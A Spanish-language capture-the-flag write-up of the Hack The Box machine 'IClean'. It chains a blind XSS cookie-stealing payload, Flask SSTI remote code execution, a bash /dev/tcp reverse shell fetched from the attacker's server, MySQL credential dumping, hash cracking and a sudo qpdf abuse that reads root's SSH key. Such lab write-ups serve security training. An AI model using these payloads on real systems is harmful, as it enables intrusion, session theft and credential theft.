---
layout: single
title: Hack The Box - IClean
excerpt: "IClean es una máquina de la plataforma Hack The Box de dificultad media. En esta máquina se explotan vulnerabilidades XSS y SSTI, mediante técnicas de bypass y enumeración local para lograr la intrusión. Además, se aprovecha la funcionalidad de una herramienta específica para escalar privilegios."
date: 2024-08-21
classes: wide
header:
  teaser: /assets/images/htb-writeup-IClean/IClean.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - XSS
  - SSTI
---


<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-IClean/IClean.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>

<br>

IClean es una máquina de la plataforma Hack The Box de dificultad media. En esta máquina se explotan vulnerabilidades XSS y SSTI, mediante técnicas de bypass y enumeración local para lograr la intrusión. Además, se aprovecha la funcionalidad de una herramienta específica para escalar privilegios.
## Enumeración
Realizando un escaneo de puertos con la herramienta nmap identifiqué los siguientes puertos abiertos:<br>
- 22 SSH
- 80 HTTP 

```bash
Nmap scan report for 10.10.11.12
Host is up, received user-set (0.14s latency).
Scanned at 2024-07-01 13:02:32 EDT for 9s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeración Web


Al revisar el sitio web de la máquina, obtuve el siguiente error. Para solucionarlo, añadí el dominio `capiclean.htb` a mi archivo `/etc/hosts`, lo que me permitió visualizar la página correctamente.

![](/assets/images/htb-writeup-IClean/host.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.12     capiclean.htb
```
![](/assets/images/htb-writeup-IClean/web1.png)

Para obtener más información acerca de las tecnologías empleadas en el sitio web utilicé la wappalyzer.

![](/assets/images/htb-writeup-IClean/web2.png)

Veo que están utilizando Flask, lo cual podría indicar una vulnerabilidad de SSTI (Server-Side Template Injection). Realizando un escaneo de directorios con Dirsearch, identifique los siguientes: 

```bash
┌──(root㉿kali)-[/opt]
└─# dirsearch -u 'http://capiclean.htb/'               
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /opt/reports/http_capiclean.htb/__24-07-01_13-55-29.txt

Target: http://capiclean.htb/

[13:55:29] Starting: 
[13:55:47] 200 -    5KB - /about                                            
[13:56:18] 302 -  189B  - /dashboard  ->  /                                 
[13:56:39] 200 -    2KB - /login                                            
[13:56:40] 302 -  189B  - /logout  ->  /                                    
[13:57:02] 403 -  278B  - /server-status                                    
[13:57:02] 403 -  278B  - /server-status/                                   
[13:57:03] 200 -    8KB - /services                                         

Task Completed    
```

Examinando manualmente el sitio web, identifiqué una página donde se puede enviar una solicitud de cotización. Parece que es la única funcionalidad del sitio, además del login.


![](/assets/images/htb-writeup-IClean/web3.png)

Intercepta la solicitud con Burp y después de realizar algunas pruebas me di cuenta que es vulnerable a Cross-Site Scripting Blind en el campo `service`.


![](/assets/images/htb-writeup-IClean/burp.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 80   
listening on [any] 80 ...
connect to [10.10.16.100] from (UNKNOWN) [10.10.11.12] 58812
GET / HTTP/1.1
Host: 10.10.16.100
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: */*
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Para capturar la cookie, utilicé el siguiente payload codificado en URL:

```html
<img src=x onerror=document.location="http://10.10.16.100/xss-75.js?c="+document.cookie>
```

![](/assets/images/htb-writeup-IClean/burp2.png)

```bash
┌──(root㉿kali)-[/opt]
└─# nc -lvnp 80              
listening on [any] 80 ...
connect to [10.10.16.100] from (UNKNOWN) [10.10.11.12] 33764
GET /xss-75.js?c=session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZoJ-cQ.ue-npu2ARF9jBsm2mP8niqHN4vo HTTP/1.1
Host: 10.10.16.100
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://127.0.0.1:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Ahora que tengo la cookie, abrí el inspector, la añadí  y accedí a la ruta dashboard identificada anteriormente, logrando ingresar al panel de administración del sitio web.


![](/assets/images/htb-writeup-IClean/cook.png)


![](/assets/images/htb-writeup-IClean/dashboard.png)

Una vez dentro del panel de administración, revisé manualmente todas las funcionalidades, probando payloads de SSTI debido al uso de Flask. En la opción para generar un QR, identifiqué un parámetro vulnerable. 


![](/assets/images/htb-writeup-IClean/stti.png)

Después intenté enviar un payload para ejecutar comandos, pero recibí un error del servidor, lo que sugiere que algunos caracteres podrían estar bloqueados.


![](/assets/images/htb-writeup-IClean/bburp.png)

Para lograr la ejecución remota de comandos utilice el sig. payload en el cual se realizan algunos bypass de caracteres como `.` y `_`

Referencia: [HackMD](https://hackmd.io/@Chivato/HyWsJ31dI)

![](/assets/images/htb-writeup-IClean/payload.png)

![](/assets/images/htb-writeup-IClean/burp3.png)

Para poder generar una reverse shell cree un archivo con el sig. contenido:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.100/443 0>&1
```

Posteriormente coloque un servidor temporal y llame mi archivo para que también se ejecutará y me regresara la shell


![](/assets/images/htb-writeup-IClean/burp4.png)

```bash
┌──(root㉿kali)-[/tmp]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.12 - - [01/Jul/2024 17:25:54] "GET /r HTTP/1.1" 200 -
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.100] from capiclean.htb [10.10.11.12] 54024
bash: cannot set terminal process group (1237): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ whoami
whoami
www-data
www-data@iclean:/opt/app$ 
```

Para trabajar mas cómodo realice un tratamiento de la TTY

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.100] from capiclean.htb [10.10.11.12] 60878
bash: cannot set terminal process group (1228): Inappropriate ioctl for device
bash: no job control in this shell
www-data@iclean:/opt/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@iclean:/opt/app$ ^Z
zsh: suspended  nc -lvp 443                                                                                                                         
┌──(root㉿kali)-[/home/kali]
└─# stty raw -echo; fg
[1]  + continued  nc -lvp 443
                                reset
www-data@iclean:/opt/app$ export TERM=xterm
www-data@iclean:/opt/app$ export SHELL=bash
```

Dentro del directorio donde obtuve la shell, hay un script en Python que contiene credenciales para iniciar sesión en MySQL

```bash
www-data@iclean:/opt/app$ cat app.py 
from flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_for
from flask import render_template_string
import pymysql
import hashlib
import os
import random, string
import pyqrcode
from jinja2 import StrictUndefined
from io import BytesIO
import re, requests, base64

app = Flask(__name__)

app.config['SESSION_COOKIE_HTTPONLY'] = False

secret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))
app.secret_key = secret_key
# Database Configuration
db_config = {
    'host': '127.0.0.1',
    'user': 'iclean',
    'password': 'pxCsmnGLckUb',
    'database': 'capiclean'
}

app._static_folder = os.path.abspath("/opt/app/static/")
```

Probé estas credenciales con el usuario de la máquina (consuela), pero no funcionaron. Entonces, inicié sesión en MySQL y, al enumerar la base de datos, identifiqué el hash de la contraseña del usuario.

```bash
www-data@iclean:/opt/app$ mysql -u iclean -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 200
Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> use capiclean;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_capiclean |
+---------------------+
| quote_requests      |
| services            |
| users               |
+---------------------+
3 rows in set (0.00 sec)

mysql> select * from users;
+----+----------+------------------------------------------------------------------+----------------------------------+
| id | username | password                                                         | role_id                          |
+----+----------+------------------------------------------------------------------+----------------------------------+
|  1 | admin    | 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51 | 21232f297a57a5a743894a0e4a801fc3 |
|  2 | consuela | 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aa | ee11cbb19052e40b07aac0ca060c23ee |
+----+----------+------------------------------------------------------------------+----------------------------------+
2 rows in set (0.00 sec)

mysql> 
```

Identifiqué que el hash de la contraseña del usuario es SHA-256, así que pude romperlo con John y luego iniciar sesión mediante SSH.


![](/assets/images/htb-writeup-IClean/hash.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt creds.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
simple and clean (?)     
1g 0:00:00:00 DONE (2024-07-01 18:51) 1.960g/s 7388Kp/s 7388Kc/s 7388KC/s sisqosgirl..sidneyMC03
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh consuela@10.10.11.12
consuela@10.10.11.12's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Mon Jul  1 10:52:13 PM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
consuela@iclean:~$ whoami
consuela
```

## Escalada de privilegios

Ejecutando **sudo -l**, pude ver que puedo ejecutar el script /usr/bin/qpdf como root sin necesidad de proporcionar contraseña.

```bash
consuela@iclean:/tmp$ sudo -l
Matching Defaults entries for consuela on iclean:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User consuela may run the following commands on iclean:
    (ALL) /usr/bin/qpdf
```

Después de revisar la documentación de la herramienta, descubrí que es posible generar un archivo duplicando el contenido de uno existente. Por lo tanto, incluí la clave SSH de root como parámetro para obtenerla al generar el archivo y poder conectarme mediante ssh.

```bash
consuela@iclean:/tmp$ sudo /usr/bin/qpdf --qdf --add-attachment /root/.ssh/id_rsa -- --empty ./id_rsa
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# ssh -i id_rsa root@10.10.11.12 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Tue Jul  2 12:05:32 AM UTC 2024




Expanded Security Maintenance for Applications is not enabled.

3 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


root@iclean:~# whoami
root
root@iclean:~# 
```

